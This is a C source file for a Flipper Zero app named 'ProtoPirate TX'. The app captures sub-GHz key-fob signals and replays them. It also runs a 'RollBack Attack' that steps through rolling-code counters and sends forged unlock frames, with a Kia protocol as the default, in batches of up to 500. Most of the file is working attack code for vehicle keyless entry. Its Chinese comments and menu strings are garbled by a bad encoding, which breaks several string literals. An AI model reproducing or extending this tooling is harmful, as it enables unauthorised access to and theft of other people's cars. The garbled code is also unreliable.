#include "protopirate_rb.h"
#include <furi_hal_subghz.h>
#include <lib/subghz/devices/cc1101_configs.h>
#include <lib/subghz/devices/devices.h>
#include <furi_hal_gpio.h>
#include <furi_hal_spi.h>
#include <furi_hal_power.h>

// ===================== 鍏ㄥ眬 SubGhz 璁惧 =====================
static const SubGhzDevice* g_subghz_device = NULL;

static bool subghz_open(void) {
    if(g_subghz_device) return true;
    g_subghz_device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
    return (g_subghz_device != NULL);
}

static void subghz_close(void) {
    if(g_subghz_device) {
        subghz_devices_end(g_subghz_device);
        g_subghz_device = NULL;
    }
}

// ===================== 鎸夐挳鍥炶皟 =====================
static void result_button_callback(void* context, int32_t index, InputType type) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app || type != InputTypePress) return;

    switch(index) {
    case 0: // Send x3
        transmit_packet(app, app->last_result.data_hi,
            app->last_result.data_lo, app->frequency, 3);
        break;
    case 1: // Send x5
        transmit_packet(app, app->last_result.data_hi,
            app->last_result.data_lo, app->frequency, 5);
        break;
    case 2: // Send x10
        transmit_packet(app, app->last_result.data_hi,
            app->last_result.data_lo, app->frequency, 10);
        break;
    case 3: // Batch Send
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchConfig);
        break;
    case 4: // RollBack Attack
        view_dispatcher_send_custom_event(app->view_dispatcher, EventRollback);
        break;
    case 5: // Back to menu
        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
        break;
    }
}

// ===================== Submenu 鑿滃崟鍥炶皟 =====================
static void rollback_menu_callback(void* context, uint32_t index) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return;
    switch(index) {
    case 0: // Start ATTACK now
        app->rollback.running = true;
        app->rollback.current_counter = app->rollback.base_counter;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventRollbackToggle);
        break;
    case 1: // Config
        view_dispatcher_send_custom_event(app->view_dispatcher, EventRollbackConfig);
        break;
    case 2: // Batch 50
        app->batch.count = 50;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 3: // Batch 100
        app->batch.count = 100;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 4: // Batch 500
        app->batch.count = 500;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 5: // Back
        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
        break;
    }
}
static void rollback_batch_menu_callback(void* context, uint32_t index) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return;
    switch(index) {
    case 0:
        app->batch.count = 50;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 1:
        app->batch.count = 100;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 2:
        app->batch.count = 500;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 3:
        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
        break;
    }
}

static void replay_menu_callback(void* context, uint32_t index) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return;
    switch(index) {
    case 0: // Replay
        if(app->last_result.bits > 0 && !app->last_result.is_demo) {
            transmit_packet(app, app->last_result.data_hi,
                app->last_result.data_lo, app->frequency, 5);
        } else {
            uint32_t hi, lo;
            rollback_build_frame_proto(app->rollback.protocol_type,
                app->rollback.serial, app->rollback.button,
                app->rollback.base_counter, &hi, &lo);
            transmit_packet(app, hi, lo, app->frequency, 5);
        }
        break;
    case 1: // Demo frame
        {
            uint32_t hi, lo;
            rollback_build_frame_proto(app->rollback.protocol_type,
                0x1234567, 2, 0x100, &hi, &lo);
            transmit_packet(app, hi, lo, app->frequency, 5);
        }
        break;
    case 2: // Batch 50
        app->batch.count = 50;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 3: // Batch 100
        app->batch.count = 100;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 4: // Batch 500
        app->batch.count = 500;
        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
        break;
    case 5: // Back
        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
        break;
    }
}

// ===================== Capture 缁撴灉鑿滃崟 =====================
static void receive_menu_callback(void* context, uint32_t index) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return;

    switch(index) {
    case 0: // Capture Now (鐪熸 RX 鎹曡幏)
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewLoading);
        if(rx_start_capture(app)) {
            FURI_LOG_I(TAG, "RX capture started on %lu Hz", app->frequency);
            // 鎹曡幏鍚庣殑鏁版嵁浼氳嚜鍔ㄥ～鍏?last_result
            FuriString* captured = rx_format_capture(app);
            if(captured) {
                DecodeResult* dec = decode_signal(app, captured);
                if(dec) {
                    memcpy(&app->last_result, dec, sizeof(DecodeResult));
                    free(dec);
                } else {
                    app->last_result.bits = 0;
                    app->last_result.is_demo = false;
                }
                furi_string_set(app->last_raw, captured);
                furi_string_free(captured);
            }
            rx_stop_capture(app);
            view_dispatcher_send_custom_event(app->view_dispatcher, EventReceiveDone);
        } else {
            // RX 澶辫触锛屽洖閫€鍒版ā鎷熸紨绀?            app->last_result.bits = 64;
            app->last_result.serial = 0x1234567;
            app->last_result.button = 2;
            strncpy(app->last_result.btn_name, "Unlock", sizeof(app->last_result.btn_name));
            strncpy(app->last_result.proto, "Kia V0", sizeof(app->last_result.proto));
            app->last_result.counter = 0xABCD;
            app->last_result.crc_ok = true;
            app->last_result.is_demo = true;
            rollback_build_frame(0x1234567, 2, 0xABCD,
                &app->last_result.data_hi, &app->last_result.data_lo);
            app->rollback.serial = app->last_result.serial;
            app->rollback.button = app->last_result.button;
            app->rollback.base_counter = app->last_result.counter;
            strncpy(app->rollback.proto, app->last_result.proto, sizeof(app->rollback.proto));
            view_dispatcher_send_custom_event(app->view_dispatcher, EventReceiveDone);
        }
        break;
    case 1: // Return
        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
        break;
    }
}

// ===================== 鐪熸 RX 鎹曡幏锛堜娇鐢?CC1101 鐩存帴鎹曡幏锛?====================
// 浣跨敤 SubGhz 璁惧杩涜 RSSI 鑴夊啿鎹曡幏
static const uint32_t rx_sample_us = 50; // 50us 閲囨牱闂撮殧
static const uint32_t rx_max_samples = 50000; // 鏈€澶?2.5 绉?static const int16_t rssi_threshold = -60; // 淇″彿闃堝€?
bool rx_start_capture(ProtoPirateApp* app) {
    if(!app) return false;
    if(!subghz_open()) {
        FURI_LOG_E(TAG, "Failed to open SubGhz device");
        return false;
    }
    
    app->rx_running = true;
    app->pulse_count = 0;
    
    FURI_LOG_I(TAG, "RX start: freq=%lu", app->frequency);
    
    // 閰嶇疆 CC1101 涓烘帴鏀舵ā寮?    subghz_devices_begin(g_subghz_device);
    subghz_devices_load_preset(g_subghz_device, FuriHalSubGhzPresetOok650Async, NULL);
    subghz_devices_set_frequency(g_subghz_device, app->frequency);
    
    // 璁剧疆鎺ユ敹甯﹀鍜屽鐩?    subghz_devices_set_rx(g_subghz_device);
    
    furi_delay_ms(10);
    
    // 鎹曡幏鑴夊啿
    uint32_t samples_taken = 0;
    bool last_level = false;
    uint32_t pulse_dur = 0;

    
    while(app->rx_running && samples_taken < rx_max_samples) {
        int16_t rssi = subghz_devices_get_rssi(g_subghz_device);
        bool level = (rssi > rssi_threshold);
        
        if(level != last_level) {
            if(pulse_dur > 0 && app->pulse_count < 4096) {
                int32_t signed_dur = pulse_dur * (int32_t)rx_sample_us;
                app->pulse_buffer[app->pulse_count++] = last_level ? signed_dur : -signed_dur;
            }
            pulse_dur = 0;
            last_level = level;
        }
        pulse_dur++;
        samples_taken++;
        
        furi_delay_us(rx_sample_us);
    }
    
    // 淇濆瓨鏈€鍚庝竴涓剦鍐?    if(pulse_dur > 0 && app->pulse_count < 4096) {
        int32_t signed_dur = pulse_dur * (int32_t)rx_sample_us;
        app->pulse_buffer[app->pulse_count++] = last_level ? signed_dur : -signed_dur;
    }
    
    subghz_devices_idle(g_subghz_device);
    subghz_devices_end(g_subghz_device);
    
    app->rx_running = false;
    app->rx_captured = (app->pulse_count > 10);
    
    FURI_LOG_I(TAG, "RX done: %u pulses captured in %lu samples", app->pulse_count, samples_taken);
    return app->rx_captured;
}

void rx_stop_capture(ProtoPirateApp* app) {
    app->rx_running = false;
}

FuriString* rx_format_capture(ProtoPirateApp* app) {
    if(!app || app->pulse_count == 0) return NULL;
    
    FuriString* result = furi_string_alloc();
    
    // 鏍煎紡: "123 -456 789 ..."
    for(uint16_t i = 0; i < app->pulse_count; i++) {
        furi_string_cat_printf(result, "%ld ", app->pulse_buffer[i]);
    }
    
    FURI_LOG_I(TAG, "rx_format: %s", furi_string_get_cstr(result));
    return result;
}

// ===================== 鑷畾涔変簨浠跺洖璋?=====================
static bool custom_event_callback(void* context, uint32_t event) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return false;

    switch(event) {
    case EventGoMenu:
        scene_main_menu_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventReceive:
        scene_receive_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventRollback:
        scene_rollback_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventRollbackConfig:
        scene_rollback_config_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewVarList);
        return true;
    case EventReplay:
        scene_replay_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventFreqSelect:
        scene_freq_select_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewVarList);
        return true;
    case EventInfo:
        scene_info_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
        return true;
    case EventReceiveDone:
        scene_result_main_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewButtonMenu);
        return true;
    case EventRollbackToggle:
        scene_rollback_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventBatchConfig:
        scene_batch_config_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventBatchSend:
        scene_batch_send_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewLoading);
        batch_send_start(app);
        scene_main_menu_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    default:
        return false;
    }
}

// ===================== 瀵艰埅鍥炶皟 =====================
static uint32_t back_to_menu_callback(void* context) {
    UNUSED(context);
    return ViewMenu;
}

static bool nav_event_callback(void* context) {
    UNUSED(context);
    return false;
}

// ===================== 搴旂敤鍒嗛厤 =====================
ProtoPirateApp* protoPirateApp_alloc(void) {
    ProtoPirateApp* app = malloc(sizeof(ProtoPirateApp));
    if(!app) return NULL;
    memset(app, 0, sizeof(ProtoPirateApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    view_dispatcher_set_custom_event_callback(app->view_dispatcher, custom_event_callback);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, nav_event_callback);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);

    app->submenu = submenu_alloc();
    app->var_item_list = variable_item_list_alloc();
    app->text_box = text_box_alloc();
    app->widget = widget_alloc();
    app->button_menu = button_menu_alloc();
    app->popup = popup_alloc();

    app->frequency = DEFAULT_FREQ;
    app->scene = SceneMainMenu;
    app->history_count = 0;
    app->last_raw = furi_string_alloc();
    app->last_raw_hex = furi_string_alloc();

    memset(&app->last_result, 0, sizeof(DecodeResult));
    strncpy(app->last_result.proto, "None", sizeof(app->last_result.proto));

    // RollBack 榛樿鍙傛暟
    app->rollback.base_counter = 0;
    app->rollback.target_counter = 100;
    app->rollback.step_size = 1;
    app->rollback.burst_count = ROLLBACK_BURST_DEFAULT;
    app->rollback.running = false;
    app->rollback.current_counter = 0;
    app->rollback.serial = 0x1234567;
    app->rollback.button = 2;
    app->rollback.counter_limit = ROLLBACK_LIMIT;
    app->rollback.protocol_type = Proto_Kia_V0;
    strncpy(app->rollback.proto, "Kia V0", sizeof(app->rollback.proto));

    // 鎵归噺榛樿
    app->batch.count = 50;
    app->batch.active = false;

    return app;
}

void protoPirateApp_free(ProtoPirateApp* app) {
    furi_assert(app);
    furi_string_free(app->last_raw);
    furi_string_free(app->last_raw_hex);
    for(uint8_t i = 0; i < app->history_count; i++) {
        if(app->history[i].raw_data) furi_string_free(app->history[i].raw_data);
    }
    view_dispatcher_remove_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewWidget);
    view_dispatcher_remove_view(app->view_dispatcher, ViewVarList);
    view_dispatcher_remove_view(app->view_dispatcher, ViewTextBox);
    view_dispatcher_remove_view(app->view_dispatcher, ViewButtonMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewPopup);
    view_dispatcher_remove_view(app->view_dispatcher, ViewDialog);
    submenu_free(app->submenu);
    variable_item_list_free(app->var_item_list);
    text_box_free(app->text_box);
    widget_free(app->widget);
    button_menu_free(app->button_menu);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    free(app);
}

// ===================== 涓昏彍鍗?=====================
static void scene_main_menu_callback(void* context, uint32_t index) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return;
    app->submenu_index = index;

    uint32_t event;
    switch(index) {
    case 0: event = EventReceive; break;
    case 1: event = EventReplay; break;
    case 2: event = EventRollback; break;
    case 3: event = EventFreqSelect; break;
    case 4: event = EventInfo; break;
    case 5:
        view_dispatcher_stop(app->view_dispatcher);
        return;
    default: return;
    }
    view_dispatcher_send_custom_event(app->view_dispatcher, event);
}

void scene_main_menu_alloc(ProtoPirateApp* app) {
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "ProtoPirate TX v2.1 涓枃鐗?);

    char freq_str[24];
    snprintf(freq_str, sizeof(freq_str), "Freq: %.3f MHz", (double)app->frequency / 1000000.0);
    
    submenu_add_item(app->submenu, "  鎹曡幏淇″彿", 0, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "  閲嶆斁淇″彿", 1, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "  鍥炴粴鏀诲嚮", 2, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, freq_str, 3, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "  鍏充簬", 4, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "  閫€鍑?, 5, scene_main_menu_callback, app);

    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
}

// ===================== Capture 鍦烘櫙 =====================
void scene_receive_alloc(ProtoPirateApp* app) {
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "鎹曡幏淇″彿");

    char freq_str[24];
    snprintf(freq_str, sizeof(freq_str), "Freq: %.3f MHz", (double)app->frequency / 1000000.0);
    submenu_add_item(app->submenu, "  >> 寮€濮嬫崟鑾?<<", 0, receive_menu_callback, app);
    submenu_add_item(app->submenu, freq_str, 0, NULL, app);
    submenu_add_item(app->submenu, "  杩斿洖鑿滃崟", 1, receive_menu_callback, app);

    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
}

// ===================== 缁撴灉鍦烘櫙 (ButtonMenu) =====================
void scene_result_main_alloc(ProtoPirateApp* app) {
    button_menu_reset(app->button_menu);
    button_menu_set_header(app->button_menu, "淇″彿宸叉崟鑾?");

    char sn_str[30];
    snprintf(sn_str, sizeof(sn_str), "鍙戦€亁3 (Sn:0x%lX)", app->last_result.serial);
    button_menu_add_item(app->button_menu, sn_str, 0, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "鍙戦€亁5", 1, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "鍙戦€亁10", 2, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "鎵归噺鍙戦€?, 3, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "鍥炴粴鏀诲嚮", 4, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "杩斿洖鑿滃崟", 5, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_set_selected_item(app->button_menu, 0);

    view_set_previous_callback(button_menu_get_view(app->button_menu), back_to_menu_callback);
}

// ===================== RollBack 鍦烘櫙 =====================
void scene_rollback_alloc(ProtoPirateApp* app) {
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "鍥炴粴鏀诲嚮");

    char line[50];
    snprintf(line, sizeof(line), "  %s Sn:0x%lX Btn:%u",
             app->rollback.proto, app->rollback.serial, app->rollback.button);
    submenu_add_item(app->submenu, line, 0, NULL, app);

    snprintf(line, sizeof(line), "  Cnt:0x%04X->0x%04X Step:%u",
             app->rollback.base_counter, app->rollback.target_counter, app->rollback.step_size);
    
    if(app->rollback.running) {
        snprintf(line, sizeof(line), "  ** ATTACK: %u/%u **",
                 app->rollback.current_counter, app->rollback.target_counter);
        submenu_add_item(app->submenu, line, 0, NULL, app);
    }

    submenu_add_item(app->submenu, "  >> 寮€濮嬫敾鍑?<<", 0, rollback_menu_callback, app);
    submenu_add_item(app->submenu, "  閰嶇疆", 1, rollback_menu_callback, app);
    submenu_add_item(app->submenu, "  鎵归噺 50娆?, 2, rollback_menu_callback, app);
    submenu_add_item(app->submenu, "  鎵归噺 100娆?, 3, rollback_menu_callback, app);
    submenu_add_item(app->submenu, "  鎵归噺 500娆?, 4, rollback_menu_callback, app);
    submenu_add_item(app->submenu, "  杩斿洖鑿滃崟", 5, rollback_menu_callback, app);
    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);

    // 濡傛灉姝ｅ湪杩愯锛屽彂閫佸綋鍓嶈鏁板櫒甯?    if(app->rollback.running) {
        int32_t diff = (int32_t)app->rollback.target_counter - app->rollback.current_counter;
        if(diff > 0) {
            for(uint8_t b = 0; b < app->rollback.burst_count; b++) {
                uint32_t dhi, dlo;
                rollback_build_frame_proto(app->rollback.protocol_type,
                    app->rollback.serial, app->rollback.button,
                    (uint32_t)app->rollback.current_counter, &dhi, &dlo);
                transmit_packet(app, dhi, dlo, app->frequency, 1);
                furi_delay_ms(10);
            }
            app->rollback.current_counter += app->rollback.step_size;
            app->rollback.total_sent += app->rollback.burst_count;
            if(app->rollback.current_counter >= app->rollback.target_counter ||
               app->rollback.current_counter >= app->rollback.counter_limit) {
                app->rollback.running = false;
            }
        } else {
            app->rollback.running = false;
        }
    }
}

// ===================== RollBack 閰嶇疆鍦烘櫙 =====================
void scene_rollback_config_alloc(ProtoPirateApp* app) {
    variable_item_list_reset(app->var_item_list);

    // 鍗忚閫夋嫨
    VariableItem* proto_item = variable_item_list_add(
        app->var_item_list, "鍗忚", Proto_COUNT,
        NULL, app);
    variable_item_set_current_value_index(proto_item, app->rollback.protocol_type);
    variable_item_set_current_value_text(proto_item,
        PROTO_NAMES[app->rollback.protocol_type]);

    // Serial
    char serial_str[16];
    snprintf(serial_str, sizeof(serial_str), "0x%lX", app->rollback.serial);
    variable_item_list_add(app->var_item_list, serial_str, 0, NULL, app);

    // Base Counter
    char base_str[16];
    snprintf(base_str, sizeof(base_str), "0x%04X", app->rollback.base_counter);
    variable_item_list_add(app->var_item_list, base_str, 0, NULL, app);

    // Target Counter
    char target_str[16];
    snprintf(target_str, sizeof(target_str), "0x%04X", app->rollback.target_counter);
    variable_item_list_add(app->var_item_list, target_str, 0, NULL, app);

    // Step
    char step_str[16];
    snprintf(step_str, sizeof(step_str), "%u", app->rollback.step_size);
    variable_item_list_add(app->var_item_list, step_str, 0, NULL, app);

    // Burst
    char burst_str[16];
    snprintf(burst_str, sizeof(burst_str), "%u", app->rollback.burst_count);
    variable_item_list_add(app->var_item_list, burst_str, 0, NULL, app);

    view_set_previous_callback(variable_item_list_get_view(app->var_item_list), back_to_menu_callback);
}

// ===================== Replay 鍦烘櫙 =====================
void scene_replay_alloc(ProtoPirateApp* app) {
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "閲嶆斁淇″彿");

    char line[40];
    if(app->last_result.bits > 0 && !app->last_result.is_demo) {
        snprintf(line, sizeof(line), "  %s Sn:0x%lX",
                 app->last_result.proto, app->last_result.serial);
        submenu_add_item(app->submenu, "  >> 绔嬪嵆閲嶆斁 <<", 0, replay_menu_callback, app);
    } else {
        submenu_add_item(app->submenu, "  >> 鍙戦€佹紨绀哄抚 <<", 0, replay_menu_callback, app);
    }
    submenu_add_item(app->submenu, "  鍙戦€佹紨绀?(Kia瑙ｉ攣)", 1, replay_menu_callback, app);
    submenu_add_item(app->submenu, "  鎵归噺鍙戦€?50娆?, 2, replay_menu_callback, app);
    submenu_add_item(app->submenu, "  鎵归噺鍙戦€?100娆?, 3, replay_menu_callback, app);
    submenu_add_item(app->submenu, "  鎵归噺鍙戦€?500娆?, 4, replay_menu_callback, app);
    submenu_add_item(app->submenu, "  杩斿洖鑿滃崟", 5, replay_menu_callback, app);

    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
}

// ===================== 鎵归噺鍙戦€佸満鏅紙鏄剧ず杩涘害锛?=====================
void scene_batch_send_alloc(ProtoPirateApp* app) {
    popup_reset(app->popup);
    popup_set_header(app->popup, "鎵归噺鍙戦€?, 42, 16, AlignCenter, AlignCenter);
    
    char line[32];
    snprintf(line, sizeof(line), "姝ｅ湪鍙戦€?%u 甯?..", app->batch.count);
    popup_set_text(app->popup, line, 42, 36, AlignCenter, AlignCenter);

    view_set_previous_callback(popup_get_view(app->popup), back_to_menu_callback);
}

// ===================== 鎵归噺鍙戦€侀厤缃?=====================
void scene_batch_config_alloc(ProtoPirateApp* app) {
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "鎵归噺鍙戦€?);

    submenu_add_item(app->submenu, "  50 甯?(蹇€?", 0, rollback_batch_menu_callback, app);
    submenu_add_item(app->submenu, "  100 甯?, 1, rollback_batch_menu_callback, app);
    submenu_add_item(app->submenu, "  500 甯?(瀹屾暣)", 2, rollback_batch_menu_callback, app);
    submenu_add_item(app->submenu, "  杩斿洖", 3, rollback_batch_menu_callback, app);
    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
}

// ===================== 棰戠巼閫夋嫨 =====================
static const uint32_t FREQ_TABLE[] = {315000000, 433920000, 868350000, 300000000, 390000000, 418000000, 868000000, 915000000};
static const char* FREQ_NAMES[] = {
    "315.00 MHz", "433.92 MHz", "868.35 MHz",
    "300.00 MHz", "390.00 MHz", "418.00 MHz",
    "868.00 MHz", "915.00 MHz"
};
#define FREQ_COUNT 8

static void freq_change_callback(VariableItem* item) {
    if(!item) return;
    ProtoPirateApp* app = variable_item_get_context(item);
    if(!app) return;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index < FREQ_COUNT) {
        app->frequency = FREQ_TABLE[index];
        variable_item_set_current_value_text(item, FREQ_NAMES[index]);
    }
}

void scene_freq_select_alloc(ProtoPirateApp* app) {
    variable_item_list_reset(app->var_item_list);
    const char* name = "棰戠巼";
    
    VariableItem* freq_item = variable_item_list_add(
        app->var_item_list, name, FREQ_COUNT,
        freq_change_callback, app);
    
    uint8_t default_idx = 1;
    for(int i = 0; i < FREQ_COUNT; i++) {
        if(app->frequency == FREQ_TABLE[i]) { default_idx = i; break; }
    }
    variable_item_set_current_value_index(freq_item, default_idx);
    variable_item_set_current_value_text(freq_item, FREQ_NAMES[default_idx]);

    view_set_previous_callback(variable_item_list_get_view(app->var_item_list), back_to_menu_callback);
}

// ===================== About =====================
void scene_info_alloc(ProtoPirateApp* app) {
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary,
                              "ProtoPirate TX");
    widget_add_string_element(app->widget, 64, 16, AlignCenter, AlignTop, FontSecondary,
                              "v2.1 鍥炴粴鐗?);
    widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontKeyboard,
                              "鐪熷疄RX + OOK瑙ｇ爜");
    widget_add_string_element(app->widget, 64, 38, AlignCenter, AlignTop, FontKeyboard,
                              "鏀寔10绉嶅崗璁?);
    widget_add_string_element(app->widget, 64, 48, AlignCenter, AlignTop, FontKeyboard,
                              "鎵归噺鍙戦€? 50/100/500");
    widget_add_string_element(app->widget, 64, 58, AlignCenter, AlignTop, FontKeyboard,
                              "鍙戝皠: 鐪熷疄CC1101");
    widget_add_string_element(app->widget, 64, 68, AlignCenter, AlignTop, FontPrimary,
                              "杩斿洖 = 鑿滃崟");

    view_set_previous_callback(widget_get_view(app->widget), back_to_menu_callback);
}

// ===================== 涓诲叆鍙?=====================
__attribute__((visibility("default"))) int32_t app_main(void* p) {
    UNUSED(p);

    ProtoPirateApp* app = protoPirateApp_alloc();
    if(!app) return -1;

    view_dispatcher_add_view(app->view_dispatcher, ViewMenu,
                            submenu_get_view(app->submenu));
    view_dispatcher_add_view(app->view_dispatcher, ViewWidget,
                            widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, ViewVarList,
                            variable_item_list_get_view(app->var_item_list));
    view_dispatcher_add_view(app->view_dispatcher, ViewTextBox,
                            text_box_get_view(app->text_box));
    view_dispatcher_add_view(app->view_dispatcher, ViewButtonMenu,
                            button_menu_get_view(app->button_menu));
    view_dispatcher_add_view(app->view_dispatcher, ViewPopup,
                            popup_get_view(app->popup));

    scene_main_menu_alloc(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_run(app->view_dispatcher);

    transmit_packet_stop(app);
    subghz_close();
    protoPirateApp_free(app);
    return 0;
}
